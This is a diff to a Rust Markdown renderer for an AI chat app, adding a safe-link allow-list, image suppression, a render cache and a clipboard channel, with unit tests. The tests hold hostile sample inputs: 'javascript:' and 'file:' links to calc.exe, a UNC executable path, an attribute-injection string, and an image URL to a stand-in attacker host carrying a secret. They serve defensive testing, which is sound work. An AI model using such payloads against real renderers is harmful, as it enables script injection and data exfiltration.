@@ -1,7 +1,7 @@
 //! Markdown → HTML rendering and unified-diff parsing used by the chat
 //! thread, plan panel and permission cards.
 
-use pulldown_cmark::{html, CodeBlockKind, Event, Options, Parser, Tag, TagEnd};
+use pulldown_cmark::{html, CodeBlockKind, CowStr, Event, Options, Parser, Tag, TagEnd};
 use std::sync::OnceLock;
 use syntect::html::{ClassStyle, ClassedHTMLGenerator};
 use syntect::parsing::SyntaxSet;
@@ -67,29 +67,129 @@ fn code_block_html(code: &str, lang: &str) -> String {
     )
 }
 
-/// JavaScript installed once at startup: copies a code block's raw text and
-/// flips its button to a check mark for 1.5 seconds.
+/// JavaScript of the long-lived copy channel (`crate::clipboard`): a code
+/// block's button sends its raw text to Rust, which writes the clipboard and
+/// answers whether it worked; only then the button shows a check mark for
+/// 1.5 seconds (FR-060).
 pub const COPY_SCRIPT: &str = r#"
 window.locagensCopy = function (button) {
-  var done = function () {
+  window.lcgnCopyButton = button;
+  dioxus.send(button.dataset.code || '');
+};
+while (true) {
+  const ok = await dioxus.recv();
+  const button = window.lcgnCopyButton;
+  if (ok && button) {
     button.classList.add('copied');
     setTimeout(function () { button.classList.remove('copied'); }, 1500);
-  };
-  navigator.clipboard.writeText(button.dataset.code || '').then(done, function () {});
-};
+  }
+}
 "#;
+
+/// Link targets the app opens (in the system browser): web pages and mail
+/// addresses only. Model output is untrusted, so `file:`, `ms-…:`, UNC,
+/// `javascript:` and relative targets are rendered as plain text (FR-034).
+pub fn is_safe_link(url: &str) -> bool {
+    let lower = url.trim_start().to_ascii_lowercase();
+    ["https://", "http://", "mailto:"].iter().any(|scheme| lower.starts_with(scheme) && lower.len() > scheme.len())
+}
+
+/// Opening tag of an allowed link; `target=_blank` hands it to the system
+/// browser instead of navigating the app window.
+fn link_open_html(url: &str, title: &str, class: &str) -> String {
+    let title = if title.is_empty() { String::new() } else { format!(" title=\"{}\"", escape_html(title)) };
+    format!(
+        "<a class=\"{class}\" href=\"{}\"{title} target=\"_blank\" rel=\"noopener noreferrer\">",
+        escape_html(url.trim())
+    )
+}
+
+/// [`render_markdown`] behind a small per-thread cache, keyed by the text and
+/// the UI language (the copy button's title), so re-rendering a long thread
+/// while one message streams does not re-highlight every other message
+/// (FR-063).
+pub fn render_markdown_cached(md: &str) -> String {
+    use std::cell::RefCell;
+    use std::collections::{HashMap, VecDeque};
+    use std::hash::{Hash, Hasher};
+    const CAPACITY: usize = 256;
+    thread_local! {
+        static CACHE: RefCell<(HashMap<u64, String>, VecDeque<u64>)> = RefCell::new((HashMap::new(), VecDeque::new()));
+    }
+    let mut hasher = std::collections::hash_map::DefaultHasher::new();
+    md.hash(&mut hasher);
+    crate::i18n::tc("md.copy").hash(&mut hasher);
+    let key = hasher.finish();
+    if let Some(hit) = CACHE.with(|cache| cache.borrow().0.get(&key).cloned()) {
+        return hit;
+    }
+    let html = render_markdown(md);
+    CACHE.with(|cache| {
+        let (map, order) = &mut *cache.borrow_mut();
+        map.insert(key, html.clone());
+        order.push_back(key);
+        while order.len() > CAPACITY {
+            if let Some(old) = order.pop_front() {
+                map.remove(&old);
+            }
+        }
+    });
+    html
+}
 
 /// Renders Markdown (tables, strikethrough, task lists enabled) to HTML.
 ///
 /// Raw HTML in the source is treated as text (model output is untrusted),
 /// tables get a scroll wrapper and code blocks become highlighted cards with
-/// a copy button.
+/// a copy button. Only `http`, `https` and `mailto` links stay links; images
+/// are never loaded (no request leaves on render): a web image becomes a
+/// link labelled with its alt text, any other image just its alt text.
 pub fn render_markdown(md: &str) -> String {
     let options = Options::ENABLE_TABLES | Options::ENABLE_STRIKETHROUGH | Options::ENABLE_TASKLISTS;
     let mut events: Vec<Event> = Vec::new();
     let mut code: Option<(String, String)> = None;
+    // Closing HTML for each open link / image (`None`: dropped, text only).
+    let mut open_links: Vec<Option<&'static str>> = Vec::new();
+    // Image alt text waiting for its end event: (url when it is a web image).
+    let mut image: Option<(Option<String>, String)> = None;
     for event in Parser::new_ext(md, options) {
+        if let Some((_, alt)) = image.as_mut() {
+            match event {
+                Event::End(TagEnd::Image) => {
+                    let (url, alt) = image.take().unwrap_or_default();
+                    let html = match url {
+                        Some(url) => {
+                            let label = if alt.trim().is_empty() { url.clone() } else { alt };
+                            format!("{}{}</a>", link_open_html(&url, "", "md-image-link"), escape_html(&label))
+                        }
+                        None => escape_html(&alt),
+                    };
+                    events.push(Event::Html(html.into()));
+                }
+                Event::Text(text) | Event::Code(text) => alt.push_str(&text),
+                _ => {}
+            }
+            continue;
+        }
         match event {
+            Event::Start(Tag::Link { dest_url, title, .. }) => {
+                if is_safe_link(&dest_url) {
+                    events.push(Event::Html(CowStr::from(link_open_html(&dest_url, &title, "md-link"))));
+                    open_links.push(Some("</a>"));
+                } else {
+                    open_links.push(None);
+                }
+            }
+            Event::End(TagEnd::Link) => {
+                if let Some(Some(close)) = open_links.pop() {
+                    events.push(Event::Html(close.into()));
+                }
+            }
+            Event::Start(Tag::Image { dest_url, .. }) => {
+                let lower = dest_url.trim_start().to_ascii_lowercase();
+                let web = (lower.starts_with("https://") || lower.starts_with("http://")).then(|| dest_url.to_string());
+                image = Some((web, String::new()));
+            }
             Event::Start(Tag::CodeBlock(kind)) => {
                 let lang = match kind {
                     CodeBlockKind::Fenced(info) => info.split_whitespace().next().unwrap_or("").to_string(),
@@ -369,5 +469,53 @@ mod tests {
     #[test]
     fn inline_code_stays_a_code_element() {
         assert!(render_markdown("use `x < y`").contains("<code>x &lt; y</code>"));
+    }
+
+    #[test]
+    fn only_web_and_mail_links_survive() {
+        for safe in ["https://example.com/a?b=1", "http://x.org", "mailto:me@example.com", "HTTPS://EXAMPLE.COM"] {
+            assert!(is_safe_link(safe), "{safe}");
+        }
+        for unsafe_link in [
+            "file:///C:/Windows/System32/calc.exe",
+            "ms-settings:privacy",
+            "\\\\server\\share\\x.exe",
+            "javascript:alert(1)",
+            "docs/readme.md",
+            "#anchor",
+            "https://",
+            "data:text/html,hi",
+            "vscode://file/x",
+        ] {
+            assert!(!is_safe_link(unsafe_link), "{unsafe_link}");
+        }
+        let html = render_markdown("[site](https://example.com \"T\") and [calc](file:///C:/calc.exe) and <ms-settings:x>");
+        assert!(html.contains("<a class=\"md-link\" href=\"https://example.com\" title=\"T\" target=\"_blank\" rel=\"noopener noreferrer\">site</a>"), "{html}");
+        assert!(!html.contains("file:"), "{html}");
+        assert!(html.contains("calc"), "the link text stays: {html}");
+        assert!(!html.contains("href=\"ms-settings"), "{html}");
+    }
+
+    #[test]
+    fn images_are_never_loaded() {
+        let html = render_markdown("![chart](https://evil.example/?d=secret) ![](https://x.org/a.png) ![local](C:/x.png)");
+        assert!(!html.contains("<img"), "{html}");
+        assert!(html.contains("<a class=\"md-image-link\" href=\"https://evil.example/?d=secret\""), "{html}");
+        assert!(html.contains(">chart</a>"), "{html}");
+        assert!(html.contains(">https://x.org/a.png</a>"), "an image without alt text shows its URL: {html}");
+        assert!(html.contains("local") && !html.contains("C:/x.png"), "{html}");
+    }
+
+    #[test]
+    fn link_urls_are_attribute_escaped() {
+        let html = render_markdown("[x](https://a.b/\"onmouseover=\"alert(1))");
+        assert!(!html.contains("\"onmouseover"), "{html}");
+    }
+
+    #[test]
+    fn cached_render_matches_the_plain_render() {
+        let md = "# Title\n\n```rust\nfn a() {}\n```\n";
+        assert_eq!(render_markdown_cached(md), render_markdown(md));
+        assert_eq!(render_markdown_cached(md), render_markdown(md));
     }
 }
